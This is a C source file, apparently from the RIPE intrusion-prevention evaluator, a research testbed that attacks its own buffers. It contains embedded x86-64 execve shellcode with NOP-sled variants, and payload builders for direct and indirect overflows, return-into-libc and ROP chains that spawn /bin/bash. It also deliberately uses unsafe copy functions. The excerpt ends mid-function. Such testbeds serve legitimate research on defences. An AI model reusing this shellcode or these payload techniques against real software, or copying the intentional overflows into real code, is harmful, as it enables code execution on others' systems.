/* RIPE was originally developed by John Wilander (@johnwilander)
 * and was debugged and extended by Nick Nikiforakis (@nicknikiforakis)
 *
 * Released under the MIT license (see file named LICENSE)
 *
 * The 64b port of RIPE was developed by Hubert ROSIER.
 *
 * This program is part the paper titled
 * RIPE: Runtime Intrusion Prevention Evaluator
 * Authored by: John Wilander, Nick Nikiforakis, Yves Younan,
 *              Mariam Kamkar and Wouter Joosen
 * Published in the proceedings of ACSAC 2011, Orlando, Florida
 *
 * Please cite accordingly.
 */

/**
 * @author John Wilander
 * 2007-01-16
 */
/** EDITED
 * @author Hubert ROSIER
 * 2019-04
 */

#include "attack_gen.h"

/* DATA SEGMENT TARGETS */
/* Declared first to avoid overflowing usefull variable */
/* Data segment buffers to inject into                                     */
static char data_buffer1[1] = "d";
static char data_buffer2[256] = "dummy";
/* Target: Pointer in data segment for indirect attack                     */
static uintptr_t *data_mem_ptr = (uintptr_t*)0x1;
/* Target: Function pointer in data segment                                */
static int (*data_func_ptr)(const char *) = &dummy_function;
/* Target: Longjump buffer in data segment                                 */
static jmp_buf data_jmp_buffer = {1, 1, 1, 1, 1, 1, 1, 1};

static struct attackme data_struct = {"ZZZZZZZZZZZZ",&dummy_function};

static ATTACK_FORM attack;
static char attack_on_bss_func_ptr = 1;

static char shellcode_nonop[] =
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
"\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
// Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library
static size_t size_shellcode_nonop = sizeof(shellcode_nonop) / sizeof(shellcode_nonop[0]) - 1;

/**
 * Shell code with simple NOP sled
 * found on http://shell-storm.org/shellcode/files/shellcode-806.php
 */
static char shellcode_simplenop[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
"\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
// Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library
static size_t size_shellcode_simplenop = sizeof(shellcode_simplenop) / sizeof(shellcode_simplenop[0]) - 1;

// sled generated with metasploit: 'generate 40 -s rsp -t c'
static char shellcode_simplenop_equivalent[] =
"\x58\x53\x96\xfd\x96\x58\x53\x95\x9f\x99\x52\x9c\x91\xf8\x58"
"\x95\x58\x53\x58\x9b\x54\x5a\x95\x99\x93\x5d\x90\x53\x9c\x52"
"\xfd\x93\x9b\x5a\x91\x57\x5e\x96\x50\x91"
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
"\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
// Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library
static size_t size_shellcode_polynop = sizeof(shellcode_simplenop_equivalent) / sizeof(shellcode_simplenop_equivalent[0]) - 1;

static char cf_ret_param[] = "/tmp/rip-eval/f_xxxx";

static char param_to_system[] = "/bin/bash";
static char* executable_path;
static boolean output_debug_info = FALSE;
static boolean output_error_msg = TRUE;

int main(int argc, char **argv) {
  int option_char, i;
  // make the stack size not computable to make compiler use leave for base pointer attacks
  char dummy_buffer[argc*10];
  for (i=0; i<argc; i++){
    dummy_buffer[i]='a';
  }
  if (dummy_buffer[21]==12)
    printf("%s", dummy_buffer);
  
  jmp_buf stack_jmp_buffer_param;

  setenv("param_to_system", "/bin/bash", 1);

  // set the global var attack
  executable_path = argv[0];
  while((option_char = getopt(argc, argv, "t:i:c:l:f:d:e:o")) != -1) {
    switch(option_char) {
      case 't':
        set_technique(optarg);
        break;
      case 'i':
        set_inject_param(optarg);
        break;
      case 'c':
        set_code_ptr(optarg);
        break;
      case 'l':
        set_location(optarg);
        break;
      case 'f':
        set_function(optarg);
        break;
      case 'd':
        if (strcmp("t", optarg) == 0) {
          output_debug_info = TRUE;
        } else {
          output_debug_info = FALSE;
        }
        break;
      default:
        if (output_error_msg) {
          fprintf(stderr, "Error: Unknown command option \"%s\"\n", optarg);
        }
        exit(1);
        break;
    }
  }

  /* Check if attack form is possible */
  if (is_attack_possible()) {
    perform_attack(&dummy_function, stack_jmp_buffer_param);
  } else {
    exit(ATTACK_IMPOSSIBLE);
  }

}

//reliable ways to get the adresses of the return address and old base pointer
#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)

void perform_attack(int (*stack_func_ptr_param)(const char *),
    jmp_buf stack_jmp_buffer_param) {

  /* STACK targets */
  /* Target: Function pointer on stack                                      */
  /* Declared before injection buffers to place it "below" on the stack     */
  int (*stack_func_ptr)(const char *);
  /* Target: Longjump buffer on stack                                       */
  /* Declared before injection buffers to place it "below" on the stack     */
  jmp_buf stack_jmp_buffer;
  /* Target: Pointer on stack for indirect attack                           */
  /* Declared before injection buffers to place it "below" on the stack     */
  /* Declared adjacent to the injection buffers, at the top of the stack,   */
  /* so an indirect attack won't overflow the stack target code pointers    */
  /* when overflowing the indirect pointer                                  */
  uintptr_t *stack_mem_ptr = 0x0;

  char stack_buffer[1024];
  char stack_buffer2[512];
  struct attackme stack_struct;
  stack_struct.func_ptr = dummy_function;


  /* HEAP TARGETS */
  /* Heap buffers to inject into                                            */
  /* Two buffers declared to be able to chose buffer that gets allocated    */
  /* first on the heap. The other buffer will be set as a target, i.e. a    */
  /* heap array of function pointers.                                       */
  char *heap_buffer1 = (char *)malloc(256 + sizeof(uintptr_t));
  char *heap_buffer2 = (char *)malloc(256 + sizeof(uintptr_t));
  char *heap_buffer3 = (char *)malloc(128 + sizeof(uintptr_t));
  /* Check that malloc went fine */
  if (heap_buffer1 == NULL || heap_buffer2 == NULL || heap_buffer3 == NULL) {
    fprintf(stderr,"Error. Unable to allocate heap memory.\n");
    exit(1);
  }
  /* Target: Pointer on heap for indirect attack                            */
  uintptr_t *heap_mem_ptr = 0x0;
  /* Target: Function pointer on heap                                       */
  /* This pointer is set by collecting a pointer value in the function      */
  /* pointer array.                                                         */
  int (**heap_func_ptr)(const char *) = (void *)heap_buffer3;
  /* Target: Longjmp buffer on the heap                                     */
  jmp_buf *heap_jmp_buffer = (jmp_buf *)malloc(sizeof(jmp_buf));

  struct attackme *heap_struct = (struct attackme*)malloc(sizeof(struct attackme));
  heap_struct->func_ptr = dummy_function;


  /* BSS TARGETS */
  /* BSS buffers to inject into                                             */
  /* Two buffers declared to try to have a buffer address without NUL on    */
  /* the lowest bits                                                        */
  static char bss_buffer1[256];
  static char bss_buffer2[256];
  /* Target: Pointer in BSS segment for indirect attack                     */
  static uintptr_t bss_dummy_value;
  /* Target: Longjmp buffer in BSS segment                                  */
  static uintptr_t *bss_mem_ptr;
  /* Target: Function pointer in BSS segment                                */
  static int (*bss_func_ptr)(const char *);
  static struct attackme bss_struct;
  /* Target: Longjmp buffer in BSS segment                                  */
  static jmp_buf bss_jmp_buffer;

  /* Pointer to buffer to overflow */
  char *buffer;
  /* Address to target for direct (part of) overflow */
  void *target_addr;
  /* Buffer for storing a generated format string */
  char format_string_buf[16];
  /* Temporary storage of payload for overflow with fscanf() */
  FILE *fscanf_temp_file;
  CHARPAYLOAD payload;

  /* Initialize function pointers to point to dummy function so    */
  /* that if the attack fails there will still be code to execute  */
  stack_func_ptr = &dummy_function;
  bss_func_ptr = &dummy_function;
  if (heap_func_ptr)
    *heap_func_ptr = dummy_function;

  /***************************************/
  /* Set location for buffer to overflow */
  /***************************************/
  switch(attack.location) {
    case STACK:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
        buffer = stack_struct.buffer;
        break;
      }

      // Try to find an address not containing any terminating characters (the first zeros are ignored)
      // if not found try with the terminating char
      buffer = stack_buffer;
      boolean buffer_selected = !contains_terminating_char((uintptr_t)buffer);
      while (!buffer_selected){
        // fprintf(stderr,"Buffer address contains terminating chars %p\n",buffer);
        buffer += rand() % 10;
        buffer_selected = !contains_terminating_char((uintptr_t)buffer);

        // Out of Bounds
        if (buffer > stack_buffer + sizeof(stack_buffer) - 100){
          if (output_debug_info){
            fprintf(stderr,"Couldn't find appropriate buffer on the stack\n"
                "Stack buffer addresses contain terminating chars: %p -> %p\n",
                stack_buffer, stack_buffer + sizeof(stack_buffer) - 100);
          }
          buffer = stack_buffer;
          buffer_selected = TRUE;
        }
      }

      break;
    case HEAP:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
        buffer = heap_struct->buffer;
        break;
      }

      if (((uintptr_t)heap_buffer1 < (uintptr_t)heap_buffer2) &&
          ((uintptr_t)heap_buffer2 < (uintptr_t)heap_buffer3)) {
        // Set the location of the memory pointer on the heap
        heap_mem_ptr = (uintptr_t *)heap_buffer2;
        // Set it to zero to avoid issue when the target address has zeros and is not copied entirely
        *heap_mem_ptr = 0x0;

        // Try to find an address not containing any terminating characters (the first zeros are ignored)
        // if not found try with the terminating char
        if (contains_terminating_char((uintptr_t)heap_buffer1)) {
          if (contains_terminating_char((uintptr_t)heap_buffer2)) {
            if (output_debug_info){
              fprintf(stderr,"Heap buffer addresses contain terminating char: %p, %p\n",
                  heap_buffer1, heap_buffer2);
            }
            // use the buffer even if it has terminating char
            buffer = heap_buffer1;
          } else {
            buffer = heap_buffer2;
            heap_mem_ptr = (uintptr_t *)heap_buffer3;
          }
        } else {
          buffer = heap_buffer1;
        }
      } else {
        if (output_error_msg) {
          fprintf(stderr, "Error: Heap buffers allocated in the wrong order.\n");
        }
        exit(1);
      }
      break;
    case BSS:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
        buffer = bss_struct.buffer;
        break;
      }

      // Try to find an address not containing any terminating characters (the first zeros are ignored)
      // if not found try with the terminating char
      if (contains_terminating_char((uintptr_t)bss_buffer1)) {
        if (contains_terminating_char((uintptr_t)bss_buffer2)) {
          if (output_debug_info){
            fprintf(stderr,"BSS buffer addresses contain terminating char: %p, %p \n",
                bss_buffer1, bss_buffer2);
          }
          // use the buffer even if it has terminating char
          buffer = bss_buffer2;
        } else {
          buffer = bss_buffer2;
        }
      } else {
        buffer = bss_buffer1;
      }
      break;
    case DATA:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
        buffer = data_struct.buffer;
        break;
      }

      // Try to find an address not containing any terminating characters (the first zeros are ignored)
      // if not found try with the terminating char
      if (contains_terminating_char((uintptr_t)data_buffer1)) {
        if (contains_terminating_char((uintptr_t)data_buffer2)) {
          if (output_debug_info){
            fprintf(stderr,"Data buffer addresses contain terminating char: %p, %p \n",
                data_buffer1, data_buffer2);
          }
          // use the buffer even if it has terminating char
          buffer = data_buffer2;
        } else {
          buffer = data_buffer2;
        }
      } else {
        buffer = data_buffer1;
      }
      break;
    default:
      if (output_error_msg) {
        fprintf(stderr, "Error: Unknown choice of location\n");
      }
      exit(1);
      break;
  }

  /************************************/
  /* Set target address for overflow, */
  /* (used to calculate payload size) */
  /************************************/
  switch(attack.technique) {
    case DIRECT:
      switch(attack.code_ptr) {
        case RET_ADDR:
          target_addr = RET_ADDR_PTR;
          break;
        case OLD_BASE_PTR:
          target_addr = OLD_BP_PTR;
          break;
        case FUNC_PTR_STACK_VAR:
          target_addr = &stack_func_ptr;
          break;
        case FUNC_PTR_STACK_PARAM:
          target_addr = &stack_func_ptr_param;
          break;
        case STRUCT_FUNC_PTR_STACK:
          target_addr = &stack_struct.func_ptr;
          break;
        case FUNC_PTR_HEAP:
          target_addr = heap_func_ptr;
          break;
        case STRUCT_FUNC_PTR_HEAP:
          target_addr = &heap_struct->func_ptr;
          break;
        case FUNC_PTR_BSS:
          target_addr = &bss_func_ptr;
          break;
        case STRUCT_FUNC_PTR_BSS:
          target_addr = &bss_struct.func_ptr;
          break;
        case FUNC_PTR_DATA:
          target_addr = &data_func_ptr;
          break;
        case STRUCT_FUNC_PTR_DATA:
          target_addr = &data_struct.func_ptr;
          break;
        case LONGJMP_BUF_STACK_VAR:
          target_addr = &stack_jmp_buffer[0].__jmpbuf[7];
          break;
        case LONGJMP_BUF_STACK_PARAM:
          target_addr = &stack_jmp_buffer_param[0].__jmpbuf[7];
          break;
        case LONGJMP_BUF_HEAP:
          target_addr = &(*heap_jmp_buffer)[0].__jmpbuf[7];
          break;
        case LONGJMP_BUF_BSS:
          target_addr = &bss_jmp_buffer[0].__jmpbuf[7];
          break;
        case LONGJMP_BUF_DATA:
          target_addr = &data_jmp_buffer[0].__jmpbuf[7];
          break;
        default:
          if (output_error_msg) {
            fprintf(stderr, "Error: Unknown choice of code pointer\n");
          }
          exit(1);
          break;
      }
      break;
    case INDIRECT:
      switch(attack.location) {
        case STACK:
          target_addr = &stack_mem_ptr;
          break;
        case HEAP:
          target_addr = heap_mem_ptr;
          break;
        case BSS:
          target_addr = &bss_mem_ptr;
          bss_mem_ptr = &bss_dummy_value;
          break;
        case DATA:
          target_addr = &data_mem_ptr;
          break;
        default:
          if (output_error_msg) {
            fprintf(stderr, "Error: Unknown choice of pointer\n");
          }
          exit(1);
          break;
      }
      break;
    default:
      if (output_error_msg) {
        fprintf(stderr, "Error: Unknown choice of technique\n");
      }
      exit(1);
      break;
  }


  /*********************/
  /* Configure payload */
  /*********************/

  // used to the address of the fake stack frame
  payload.buffer_addr = (uintptr_t)buffer;
  // Set longjmp buffers
  payload.old_base_ptr = OLD_BP_PTR;
  // used for r2libc and rop attack on jmp_buf
  payload.stack_buffer = stack_buffer2;
  switch(attack.code_ptr) {
    case LONGJMP_BUF_STACK_VAR:
      // Make sure the setjmp() is successful
      if (setjmp(stack_jmp_buffer) != 0)
        return;
      payload.jmp_buffer = &stack_jmp_buffer;
      break;
    case LONGJMP_BUF_HEAP:
      // Make sure the setjmp() is successful
      if (setjmp(*heap_jmp_buffer) != 0)
        return;
      payload.jmp_buffer = heap_jmp_buffer;
      break;
    case LONGJMP_BUF_BSS:
      // Make sure the setjmp() is successful
      if (setjmp(bss_jmp_buffer) != 0)
        return;
      payload.jmp_buffer = (void *)bss_jmp_buffer;
      break;
    case LONGJMP_BUF_DATA:
      // Make sure the setjmp() is successful
      if (setjmp(data_jmp_buffer) != 0)
        return;
      payload.jmp_buffer = (void *)data_jmp_buffer;
      break;
    case LONGJMP_BUF_STACK_PARAM:
      // Make sure the setjmp() is successful
      if (setjmp(stack_jmp_buffer_param) != 0)
        return;
      payload.jmp_buffer = (void *)stack_jmp_buffer_param;
      break;
    default:
      // Not an attack against a longjmp buffer
      break;
  }
  payload.ptr_to_correct_return_addr = (uintptr_t)*RET_ADDR_PTR;


  payload.inject_param = attack.inject_param;

  // Bytes of the gadgets instruction we are looking for
  char r2libc_gadget_chars[] = {0x90, 0x5F, 0xC3, '\0'};
  char rop_gadget_chars[] = {0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, '\0'};
  switch(attack.technique) {
    case DIRECT:
      // Here payload.overflow_ptr will point to the attack code since
      // a direct attack overflows the pointer target directly
      switch(attack.inject_param) {
        case INJECTED_CODE_NO_NOP:
        case INJECTED_CODE_SIMPLE_NOP:
        case INJECTED_CODE_SIMPLE_NOP_EQUIVALENT:
          payload.overflow_ptr = buffer;
          break;
        case RETURN_INTO_LIBC:
          if (attack.code_ptr == OLD_BASE_PTR || attack.code_ptr == RET_ADDR ||
              attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
              attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
              attack.code_ptr == LONGJMP_BUF_HEAP ||
              attack.code_ptr == LONGJMP_BUF_BSS ||
              attack.code_ptr == LONGJMP_BUF_DATA) {
            // Look for the offset to the gadget 'pop %rdi; ret;'= 0x5fc3
            // to store '/bin/sh' in the rdi register.
            // Use a nop to make sure that we find the gadget from gagdet4
            payload.overflow_ptr = &gadget4 + find_gadget_offset(r2libc_gadget_chars);
          } else {
            // for the other attacks we overflow function pointer and the function
            // is called with "/bin/bash" as parameter.
            payload.overflow_ptr = &system;
          }
          break;
        case RETURN_ORIENTED_PROGRAMMING:
          payload.overflow_ptr = &gadget1 + find_gadget_offset(rop_gadget_chars);
          break;
        default:
          if (output_error_msg) {
            fprintf(stderr, "Error: Unknown choice of attack parameter\n");
          }
          exit(1);
          break;
      }
      break;
    case INDIRECT:
      /* Here payload.overflow_ptr will point to the final pointer target   */
      /* since an indirect attack first overflows a general pointer that in */
      /* turn is dereferenced to overwrite the target pointer               */
      switch(attack.code_ptr) {
        case RET_ADDR:
          payload.overflow_ptr = RET_ADDR_PTR;
          break;
        case OLD_BASE_PTR:
          payload.overflow_ptr = OLD_BP_PTR;
          if (attack.inject_param == RETURN_INTO_LIBC) {
            // Look for the offset to the gadget 'pop %rdi; ret;'= 0x5fc3
            // to store '/bin/sh' in the rdi register.
            // Use a nop to make sure that we find the gadget from gagdet4
            payload.fake_return_addr = &gadget4 + find_gadget_offset(r2libc_gadget_chars);
          } else if ( attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
            // TODO: improve and set the first entry point here and not in the build_payload
            // to first gadget
            payload.fake_return_addr = 0;
          } else {
            payload.fake_return_addr = (uintptr_t *)buffer;
          }
          break;
        case FUNC_PTR_STACK_VAR:
          payload.overflow_ptr = &stack_func_ptr;
          break;
        case FUNC_PTR_STACK_PARAM:
          payload.overflow_ptr = &stack_func_ptr_param;
          break;
        case STRUCT_FUNC_PTR_STACK:
          payload.overflow_ptr = &stack_struct.func_ptr;
          break;
        case FUNC_PTR_HEAP:
          payload.overflow_ptr = heap_func_ptr;
          break;
        case STRUCT_FUNC_PTR_HEAP:
          payload.overflow_ptr = &heap_struct->func_ptr;
          break;
        case FUNC_PTR_BSS:
          payload.overflow_ptr = &bss_func_ptr;
          break;
        case STRUCT_FUNC_PTR_BSS:
          payload.overflow_ptr = &bss_struct.func_ptr;
          break;
        case FUNC_PTR_DATA:
          payload.overflow_ptr = &data_func_ptr;
          break;
        case STRUCT_FUNC_PTR_DATA:
          payload.overflow_ptr = &data_struct.func_ptr;
          break;
        case LONGJMP_BUF_STACK_VAR:
          payload.overflow_ptr = &stack_jmp_buffer[0].__jmpbuf[7];
          break;
        case LONGJMP_BUF_STACK_PARAM:
          payload.overflow_ptr = &stack_jmp_buffer_param[0].__jmpbuf[7];
          break;
        case LONGJMP_BUF_HEAP:
          payload.overflow_ptr = &(*heap_jmp_buffer)[0].__jmpbuf[7];
          break;
        case LONGJMP_BUF_BSS:
          payload.overflow_ptr = &bss_jmp_buffer[0].__jmpbuf[7];
          break;
        case LONGJMP_BUF_DATA:
          payload.overflow_ptr = &data_jmp_buffer[0].__jmpbuf[7];
          break;
        default:
          if (output_error_msg) {
            fprintf(stderr, "Error: Unknown choice of code pointer\n");
          }
          exit(1);
          break;
      }
      break;
    default:
      if (output_error_msg) {
        fprintf(stderr, "Error: Unknown choice of technique\n");
      }
      exit(1);
      break;
  }
  if (contains_terminating_char((uintptr_t)payload.overflow_ptr)) {
    fprintf(stderr,"Overflow pointer contains terminating char: %p\n"
        "It can be an issue when abusing string copy functions.\n", payload.overflow_ptr);
  }

  if (are_variables_well_located((uintptr_t)buffer, (uintptr_t)target_addr, (uintptr_t)payload.overflow_ptr)) {
    /* Calculate payload size for overflow of chosen target address */
    payload.size = (uintptr_t)((uintptr_t)target_addr - (uintptr_t)buffer
          + sizeof(uintptr_t) + sizeof(char));
    // There will be a terminating char at the end of the payload
    // for string functions in standard library
    if (output_debug_info)
      fprintf(stderr, "payload size == %zu\n", payload.size);
  } else {
    exit(1);
  }

  /* Set first byte of buffer to null to allow concatenation functions to */
  /* start filling the buffer from that first byte                        */
  buffer[0] = '\0';

  /*****************/
  /* Build payload */
  /*****************/
  if (!build_payload(&payload)) {
    if (output_error_msg) {
      fprintf(stderr, "Error: Could not build payload\n");
      fflush(stderr);
    }
    exit(1);
  }

  // In the attack on bss func ptr, the 'attack' variable is corrupted
  // we copy the interesting value before corruption
  attack_on_bss_func_ptr = (attack.code_ptr == FUNC_PTR_BSS);

  locate_terminating_chars(payload.buffer, payload.size);

  /****************************************/
  /* Overflow buffer with chosen function */
  /* Note: Here memory will be corrupted  */
  /****************************************/
  switch(attack.function) {
    case MEMCPY:
      // memcpy() shouldn't copy the terminating NULL, therefore - 1
      memcpy(buffer, payload.buffer, payload.size - 1);
      break;
    case STRCPY:
      strcpy(buffer, payload.buffer);
      break;
    case STRNCPY:
      strncpy(buffer, payload.buffer, payload.size);
      break;
    case SPRINTF:
      sprintf(buffer, "%s", payload.buffer);
      break;
    case SNPRINTF:
      snprintf(buffer, payload.size, "%s", payload.buffer);
      break;
    case STRCAT:
      strcat(buffer, payload.buffer);
      break;
    case STRNCAT:
      strncat(buffer, payload.buffer, payload.size);
      break;
    case SSCANF:
      snprintf(format_string_buf, 15, "%%%zuc", payload.size);
      sscanf(payload.buffer, format_string_buf, buffer);
      break;
    case FSCANF:
      snprintf(format_string_buf, 15, "%%%zuc", payload.size);
      fscanf_temp_file = fopen("./fscanf_temp_file", "w+");
      fprintf(fscanf_temp_file, "%s", payload.buffer);
      rewind(fscanf_temp_file);
      fscanf(fscanf_temp_file, format_string_buf, buffer);
      /**  Fclose will try to do pointer arithmetic with rbp which is now broken and thus will crash
       *   instead of returning... when this function returns, then the shellcode is triggered correctly

       *fclose(fscanf_temp_file);
       *unlink("./fscanf_temp_file");
       **/
      break;
    case HOMEBREW:
      homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
      break;
    default:
      if (output_error_msg) {
        fprintf(stderr, "Error: Unknown choice of function\n");
      }
      exit(1);
      break;
  }

  if (attack.technique == INDIRECT) {
    if (attack.code_ptr == OLD_BASE_PTR) {
      // Point to the old base pointer of the fake stack frame
      *(uintptr_t *)(*(uintptr_t *)target_addr) =
        (uintptr_t)(buffer + payload.size - // end of buffer
            sizeof(char) -       // null terminator
            sizeof(uintptr_t) -  // injected new base ptr
            payload.offset_to_fake_return_addr -
            sizeof(uintptr_t));  // the copied base ptr
    } else if (attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
        attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
        attack.code_ptr == LONGJMP_BUF_HEAP ||
        attack.code_ptr == LONGJMP_BUF_BSS ||
        attack.code_ptr == LONGJMP_BUF_DATA) {
      // Point to the buffer with attack code and mangle it
      uintptr_t mangled_base_pointer = *(((uintptr_t *)payload.jmp_buffer)+1);
      *(uintptr_t *)(*(uintptr_t *)target_addr) = (uintptr_t)(rol((uintptr_t)buffer) ^
          rol((uintptr_t)payload.old_base_ptr) ^ mangled_base_pointer); // key

    } else if (attack.inject_param == RETURN_INTO_LIBC){
      // Point to system to replace the func_ptr by it
      *(uintptr_t *)(*(uintptr_t *)target_addr) = (uintptr_t)&system;
    } else {
      // Point to the attack code
      *(uintptr_t *)(*(uintptr_t *)target_addr) = (uintptr_t)buffer;
    }
  }

  // In the attack on bss func ptr, the 'attack' variable is corrupted
  if (attack_on_bss_func_ptr)
    ((int (*)(char *)) (*bss_func_ptr))("/bin/bash");
  else
    switch(attack.code_ptr) {
      case RET_ADDR:
      case OLD_BASE_PTR:
        /* Just let the function carry on and eventually return */
        break;
      case FUNC_PTR_STACK_VAR:
        ((int (*)(char *)) (*stack_func_ptr)) ("/bin/bash");
        break;
      case FUNC_PTR_STACK_PARAM:
        ((int (*)(char *)) (*stack_func_ptr_param))("/bin/bash");
        break;
      case STRUCT_FUNC_PTR_STACK:
        (*stack_struct.func_ptr)("/bin/bash");
        break;
      case FUNC_PTR_HEAP:
        ((int (*)(char *)) (*heap_func_ptr)) ("/bin/bash");
        break;
      case STRUCT_FUNC_PTR_HEAP:
        (*heap_struct->func_ptr)("/bin/bash");
        break;
      case FUNC_PTR_BSS:
        ((int (*)(char *)) (*bss_func_ptr))("/bin/bash");
        break;
      case STRUCT_FUNC_PTR_BSS:
        (*bss_struct.func_ptr)("/bin/bash");
        break;
      case FUNC_PTR_DATA:
        ((int (*)(char *)) (*data_func_ptr))("/bin/bash");
        break;
      case STRUCT_FUNC_PTR_DATA:
        (*data_struct.func_ptr)("/bin/bash");
        break;
      case LONGJMP_BUF_STACK_VAR:
        longjmp(stack_jmp_buffer, 1);
        break;
      case LONGJMP_BUF_HEAP:
        longjmp(*heap_jmp_buffer, 1);
        break;
      case LONGJMP_BUF_BSS:
        longjmp(bss_jmp_buffer, 1);
        break;
      case LONGJMP_BUF_DATA:
        longjmp(data_jmp_buffer, 1);
        break;
      case LONGJMP_BUF_STACK_PARAM:
        longjmp(stack_jmp_buffer_param, 1);
        break;
      default:
        if (output_error_msg)
          fprintf(stderr, "Error: Unknown choice of code pointer\n");
        exit(1);
        break;
    }
}

/*******************/
/* BUILD_PAYLOAD() */
/*******************/
boolean build_payload(CHARPAYLOAD *payload) {
  size_t size_shellcode, bytes_to_pad;
  char *shellcode, *temp_char_buffer, *temp_char_ptr;


  switch(attack.inject_param) {
    case INJECTED_CODE_NO_NOP:
      if (payload->size < (size_shellcode_nonop + sizeof(uintptr_t))) {
        return FALSE;
      }
      size_shellcode = size_shellcode_nonop;
      shellcode = shellcode_nonop;
      break;
    case INJECTED_CODE_SIMPLE_NOP:
      if (payload->size < (size_shellcode_simplenop + sizeof(uintptr_t))) {
        return FALSE;
      }
      size_shellcode = size_shellcode_simplenop;
      shellcode = shellcode_simplenop;
      break;
    case INJECTED_CODE_SIMPLE_NOP_EQUIVALENT:
      if (payload->size < (size_shellcode_polynop + sizeof(uintptr_t))) {
        return FALSE;
      }
      size_shellcode = size_shellcode_polynop;
      shellcode = shellcode_simplenop_equivalent;
      break;
    case RETURN_INTO_LIBC:
    case RETURN_ORIENTED_PROGRAMMING:
      if (payload->size < sizeof(uintptr_t)) {
        return FALSE;
      }
      size_shellcode = 0;
      shellcode = "dummy";
      break;
    default:
      if (output_error_msg) {
        fprintf(stderr, "Error: Unknown choice of attack parameter");
      }
      exit(1);
      break;
  }

  //at this point, shellcode points to the correct shellcode and shellcode size points
  //to the correct size

  // Allocate payload buffer
  payload->buffer = (char *)malloc(payload->size);
  if (payload->buffer == NULL) {
    perror("Unable to allocate payload buffer.");
    return FALSE;
  }
  /* Copy shellcode into payload buffer */
  memcpy(payload->buffer, shellcode, size_shellcode);

  /* Calculate number of bytes to pad with */
  /* size - shellcode - target address - null terminator */
  bytes_to_pad =
    (payload->size - size_shellcode - sizeof(uintptr_t) - sizeof(char));

  /* Pad payload buffer with dummy bytes */
  memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);

  /* If the payload happens to contain a null that null will */
  /* terminate all string functions so we try removing them  */
  if (!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)) {
    remove_nulls(payload->buffer, payload->size);
  }

  // Special cases
  /* *************************************** */
  /* Special case: Build return address      */
  /* *************************************** */
  if (attack.code_ptr == RET_ADDR  && attack.technique == DIRECT &&
      attack.inject_param == RETURN_INTO_LIBC) {
    // end of payload:
    // High addresses
    // \0
    // fake ret add
    // &system
    // pointer to /bin/sh    (param to system put in rdi with gadget)
    // @ of 'pop %rdi; ret'  (instead of the ret address)
    // Low addresses

    // replace the ret address with the address of the first gadget
    memcpy(payload->buffer + payload->size - sizeof(uintptr_t) - sizeof(char),
        &(payload->overflow_ptr),
        sizeof(uintptr_t));

    /* Extend the payload to add a fake ret add and the parameter to system */
    payload->size += 3*sizeof(uintptr_t);
    // Allocate new payload buffer
    temp_char_buffer = (char *)malloc(payload->size);
    // Copy current payload to new payload buffer
    memcpy(temp_char_buffer, payload->buffer, payload->size);

    memcpy(temp_char_buffer + payload->size - 1*sizeof(uintptr_t) - sizeof(char),
        &(payload->ptr_to_correct_return_addr),
        sizeof(uintptr_t));

    void * system_ptr = &system;
    memcpy(temp_char_buffer + payload->size - 2*sizeof(uintptr_t) - sizeof(char),
        &system_ptr,
        sizeof(uintptr_t));

    temp_char_ptr = getenv("param_to_system");
    memcpy(temp_char_buffer + payload->size - 3*sizeof(uintptr_t) - sizeof(char),
        &temp_char_ptr,
        sizeof(uintptr_t));

    // Free the old payload buffer
    free(payload->buffer);
    // Set the new payload buffer
    payload->buffer = temp_char_buffer;

  } else if (attack.code_ptr == RET_ADDR  && attack.technique == DIRECT &&
      attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
    char search_chars1[] = {0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, '\0'};
    temp_char_ptr = getenv("param_to_system");
    char search_chars2[] = {0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00, 0xc3, '\0'};
    char search_chars3[] = {0x0f, 0x05, '\0'};
    uintptr_t rop_sled[] = {
      (uintptr_t)&gadget1 + find_gadget_offset(search_chars1),
      (uintptr_t)temp_char_ptr,
      (uintptr_t)&gadget2 + find_gadget_offset(search_chars2),
      (uintptr_t)&gadget3 + find_gadget_offset(search_chars3),
      (uintptr_t)&exit};

    payload->size += 4*sizeof(uintptr_t);
    temp_char_buffer = (char *)malloc(payload->size);
    memcpy(temp_char_buffer, payload->buffer, payload->size);

    memcpy(temp_char_buffer + payload->size - 1*sizeof(uintptr_t) - sizeof(char),
        &rop_sled[4],
        sizeof(uintptr_t));
    memcpy(temp_char_buffer + payload->size - 2*sizeof(uintptr_t) - sizeof(char),
        &rop_sled[3],
        sizeof(uintptr_t));
    memcpy(temp_char_buffer + payload->size - 3*sizeof(uintptr_t) - sizeof(char),
        &rop_sled[2],
        sizeof(uintptr_t));
